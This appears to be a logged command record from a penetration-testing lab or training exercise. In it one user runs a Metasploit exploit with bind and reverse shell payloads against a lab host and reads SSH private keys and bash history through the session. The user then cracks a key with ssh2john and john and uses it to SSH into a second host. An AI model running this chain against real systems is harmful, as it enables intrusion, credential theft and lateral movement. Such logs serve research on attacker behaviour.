User 42 start time 1594797701 end 1594805700
PADDING
PADDING
PADDING
INPUT|42--76|M6 |1594800073|42|set RHOSTS |OUTPUT
INPUT|42--77|A6 |1594800073|42|set TARGETURI /|OUTPUT
INPUT|42--78|A6 |1594800073|42|set TARGET 0|OUTPUT
INPUT|42--79|M6 |1594800073|42|set LHOST 10.1.135.83|OUTPUT
INPUT|42--80|A6 |1594800074|42|set LPORT 26069|OUTPUT
INPUT|42--81|M6 |1594800074|42|set PAYLOAD generic/shell_bind_tcp|OUTPUT
INPUT|42--82|M6 |1594800074|42|set RPORT 10000|OUTPUT
INPUT|42--83|A6 |1594800074|42|set SSL 0|OUTPUT
INPUT|42--84|M8 |1594800083|42|exploit -j|OUTPUT
INPUT|42--85|M8 |1594800104|42|use exploit/multi/handler|OUTPUT
INPUT|42--86|M6 |1594800104|42|set LHOST 10.1.135.83|OUTPUT
INPUT|42--87|A6 |1594800104|42|set LPORT 8871|OUTPUT
INPUT|42--88|M6 |1594800104|42|set PAYLOAD generic/shell_reverse_tcp|OUTPUT
INPUT|42--89|A6 A10 |1594800104|42|set ExitOnSession false|OUTPUT
INPUT|42--90|M8 |1594800106|42|exploit -j|OUTPUT
INPUT|42--91|U|1594800149|42|hosts -a 172.18.1.5|OUTPUT
INPUT|42--92|U|1594800154|42|back|OUTPUT
INPUT|42--93|M8 |1594800172|42|use exploit/47230|OUTPUT
INPUT|42--94|M6 |1594800177|42|set RHOSTS 172.18.1.5|OUTPUT
INPUT|42--95|A6 |1594800182|42|set TARGETURI /|OUTPUT
INPUT|42--96|A6 |1594800187|42|set TARGET 0|OUTPUT
INPUT|42--97|M6 |1594800192|42|set LHOST 10.1.135.83|OUTPUT
INPUT|42--98|A6 |1594800197|42|set LPORT 17595|OUTPUT
INPUT|42--99|M6 |1594800202|42|set PAYLOAD generic/shell_bind_tcp|OUTPUT
INPUT|42--100|M6 |1594800207|42|set RPORT 10000|OUTPUT
INPUT|42--101|A6 |1594800212|42|set SSL 0|OUTPUT
INPUT|42--102|M8 |1594800217|42|exploit -j|OUTPUT
INPUT|42--103|U|1594800277|42|sessions|OUTPUT
INPUT|42--104|U|1594800301|42|sessions -u 3|OUTPUT
INPUT|42--105|U|1594800348|42|sessions --help|OUTPUT
INPUT|42--106|U|1594800354|42|sessions -h|OUTPUT
INPUT|42--107|A10 |1594800398|42|sessions -c 3 ls|OUTPUT
INPUT|42--108|A10 |1594800409|42|sessions 3 -c ls|OUTPUT
INPUT|42--109|U|1594800430|42|sessions 3 -c dir|OUTPUT
INPUT|42--110|A10 |1594800441|42|sessions 3 -c ls|OUTPUT
INPUT|42--111|U|1594800513|42|sessions 3 -c dir|OUTPUT
INPUT|42--112|U|1594800600|42|sessions 3 -c cd /|OUTPUT
INPUT|42--113|U|1594800619|42|sessions 3 -c pwd|OUTPUT
INPUT|42--114|U|1594800655|42|sessions 3 -c dir|OUTPUT
INPUT|42--115|U|1594800787|42|sessions 3 -c WARNING-READ-ME.txt|OUTPUT
INPUT|42--116|U|1594800828|42|sessions 3 -c nano WARNING-READ-ME.txt|OUTPUT
INPUT|42--117|U|1594800946|42|sessions 3 -c leafpad WARNING-READ-ME.txt|OUTPUT
INPUT|42--118|U|1594800986|42|sessions 3 -c editor WARNING-READ-ME.txt|OUTPUT
INPUT|42--119|U|1594801178|42|sessions 3 -c editor WARNING-READ-ME.txt|OUTPUT
INPUT|42--120|U|1594801239|42|sessions -u |OUTPUT
INPUT|42--121|U|1594801260|42|sessions -u 1|OUTPUT
INPUT|42--122|U|1594801276|42|sessions|OUTPUT
INPUT|42--123|M9 |1594801366|42|sessions 3 -c less WARNING-READ-ME.txt|OUTPUT
INPUT|42--124|A10 |1594801583|42|sessions 3 -c ls|OUTPUT
INPUT|42--125|U|1594801659|42|sessions -k 3|OUTPUT
INPUT|42--126|U|1594801675|42|sessions -c cd ?|OUTPUT
INPUT|42--127|U|1594801683|42|sessions -c cd /|OUTPUT
INPUT|42--128|U|1594801719|42|sessions -c cd /|OUTPUT
INPUT|42--129|U|1594801730|42|sessions -c dir|OUTPUT
INPUT|42--130|A3 |1594801780|42|sessions -c search history|OUTPUT
INPUT|42--131|A10 |1594801841|42|sessions -c find history|OUTPUT
INPUT|42--132|M10 |1594801902|42|sessions -c find *.bash_history|OUTPUT
INPUT|42--133|M10 |1594801933|42|sessions -c find -name *.bash_history|OUTPUT
INPUT|42--134|U|1594801969|42|sessions -c dir /home/eve|OUTPUT
INPUT|42--135|A10 |1594801976|42|sessions -c ls|OUTPUT
INPUT|42--136|U|1594802006|42|sessions -c dir /home|OUTPUT
INPUT|42--137|U|1594802043|42|sessions -c cd /home/eve|OUTPUT
INPUT|42--138|A10 |1594802052|42|sessions -c ls|OUTPUT
INPUT|42--139|M11 |1594802115|42|sessions 3 -c less .bash_history|OUTPUT
INPUT|42--140|U|1594802292|42|hosts -a 10.1.17.4|OUTPUT
INPUT|42--141|U|1594802297|42|back|OUTPUT
INPUT|42--142|U|1594802393|42|sessions 3 -c tree|OUTPUT
INPUT|42--143|U|1594802432|42|sessions 3 -c pwd|OUTPUT
INPUT|42--144|U|1594802443|42|sessions 3 -c dir|OUTPUT
INPUT|42--145|U|1594802463|42|sessions 3 -c cd /|OUTPUT
INPUT|42--146|M10 |1594802492|42|sessions 3 -c find -name ssh|OUTPUT
INPUT|42--147|A16 |1594802634|42|sessions 3 -c cd /etc/ssh|OUTPUT
INPUT|42--148|U|1594802641|42|sessions 3 -c dir|OUTPUT
INPUT|42--149|A9 A11 A12 A16 A17 |1594802681|42|sessions 3 -c less ssh_host_rsa_key|OUTPUT
INPUT|42--150|A16 |1594802850|42|openssh|OUTPUT
INPUT|42--151|A16 |1594802851|42|ssh|OUTPUT
INPUT|42--152|M16 |1594802925|42|ssh -i /root/ssh|OUTPUT
INPUT|42--153|U|1594802934|42|dir|OUTPUT
INPUT|42--154|U|1594802943|42|dir desktop|OUTPUT
INPUT|42--155|U|1594802947|42|dir Desktop|OUTPUT
INPUT|42--156|M16 |1594802961|42|ssh -i /root/desktop/ssh|OUTPUT
INPUT|42--157|A9 A11 A12 A16 A17 |1594802983|42|less /desktop/ssh|OUTPUT
INPUT|42--158|U|1594802997|42|pwd|OUTPUT
INPUT|42--159|A9 A11 A12 A16 A17 |1594803013|42|less /root/desktop/ssh|OUTPUT
INPUT|42--160|A9 A11 A12 A16 A17 |1594803019|42|less /root/Desktop/ssh|OUTPUT
INPUT|42--161|M16 |1594803077|42|ssh -i /root/Desktop/ssh 10.1.17.4|OUTPUT
INPUT|42--162|A9 A11 A12 A16 A17 |1594803192|42|sessions 3 -c less ssh_host_ecdsa_key.pub|OUTPUT
INPUT|42--163|M16 |1594803279|42|ssh -i /root/Desktop/sshpub 10.1.17.4|OUTPUT
INPUT|42--164|A9 A11 A12 A16 A17 |1594803350|42|sessions 3 -c less ssh_host_ecdsa_key|OUTPUT
INPUT|42--165|M16 |1594803398|42|ssh -i /root/Desktop/ssh 10.1.17.4|OUTPUT
INPUT|42--166|A16 |1594803416|42|ssh|OUTPUT
INPUT|42--167|M16 |1594803440|42|ssh -i /root/Desktop/ssh 10.1.17.4|OUTPUT
INPUT|42--168|A9 A11 A12 A16 A17 |1594803559|42|sessions 3 -c less ssh_config|OUTPUT
INPUT|42--169|M16 |1594803790|42|ssh -i /etc/ssh/ssh_comp 10.1.17.4|OUTPUT
INPUT|42--170|A15 A16 |1594803895|42|chmod 600 /etc/ssh/ssh_comp|OUTPUT
INPUT|42--171|M16 |1594803901|42|ssh -i /etc/ssh/ssh_comp 10.1.17.4|OUTPUT
INPUT|42--172|A16 |1594804015|42|sessions 3 -c cd /usr/bin/ssh|OUTPUT
INPUT|42--173|A10 |1594804024|42|sessions 3 -c ls|OUTPUT
INPUT|42--174|A9 A11 A12 A16 A17 |1594804066|42|sessions 3 -c less sshd_config|OUTPUT
INPUT|42--175|A10 |1594804141|42|sessions 3 -c ls|OUTPUT
INPUT|42--176|A9 A11 A12 A16 A17 |1594804162|42|sessions 3 -c less ssh_host_ecdsa_key|OUTPUT
INPUT|42--177|U|1594804301|42|sessions -c cd /|OUTPUT
INPUT|42--178|A10 |1594804323|42|sessions -c find -fname ecdsa|OUTPUT
INPUT|42--179|M10 |1594804357|42|sessions -c find -name ecdsa|OUTPUT
INPUT|42--180|M10 |1594804494|42|sessions -c find -name ecdsa_key|OUTPUT
INPUT|42--181|A10 |1594804560|42|sessions -c find -fname *ecdsa_key|OUTPUT
INPUT|42--182|A10 A16 |1594804584|42|sessions -c find -fname ssh_host_ecdsa_key|OUTPUT
INPUT|42--183|U|1594804598|42|sessions -c pwd|OUTPUT
INPUT|42--184|A10 |1594804616|42|sessions -c ls|OUTPUT
INPUT|42--185|M13 |1594804729|42|python ssh2john.py|OUTPUT
INPUT|42--186|M13 |1594804757|42|python ssh2john.py /etc/ssh/ssh_comp|OUTPUT
INPUT|42--187|M13 |1594804817|42|python ssh2john.py --help|OUTPUT
INPUT|42--188|M13 |1594804835|42|python ssh2john.py|OUTPUT
INPUT|42--189|M13 |1594804966|42|python ssh2john.py|OUTPUT
INPUT|42--190|M13 |1594804981|42|python ssh2john.py /root/Desktop/ssh_comp|OUTPUT
INPUT|42--191|M14 |1594805229|42|john --wordlist rockyou.txt /root/Desktop/john|OUTPUT
INPUT|42--192|M14 |1594805252|42|john --wordlist /root/Desktop/john|OUTPUT
INPUT|42--193|M14 |1594805526|42|john --wordlist /usr/share/wordlists/rockyou.txt /root/Desktop/john|OUTPUT
INPUT|42--194|M16 |1594805581|42|ssh -i /etc/ssh/ssh_comp 10.1.17.4|OUTPUT
INPUT|42--195|M16 |1594805631|42|ssh -i /usr/Desktop/ssh_comp 10.1.17.4|OUTPUT
INPUT|42--196|M16 |1594805663|42|ssh -i /root/Desktop/ssh_comp 10.1.17.4|OUTPUT
INPUT|42--197|A15 A16 |1594805696|42|chmod 600 /root/Desktop/ssh_comp|OUTPUT
INPUT|42--198|M16 |1594805700|42|ssh -i /root/Desktop/ssh_comp 10.1.17.4|OUTPUT
